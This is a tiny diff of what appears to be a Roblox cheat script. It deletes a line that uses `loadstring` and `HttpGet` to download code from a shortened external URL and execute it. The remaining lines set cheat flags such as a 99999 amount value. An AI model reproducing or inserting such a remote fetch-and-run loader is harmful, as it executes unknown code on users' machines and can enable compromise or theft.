@@ -1,5 +1,3 @@
-loadstring(game:HttpGet("https://yip.su/2UgZK4",true))()
-wait(.1)
 getgenv().smtx = false
 getgenv().smtxAmount = 99999
 
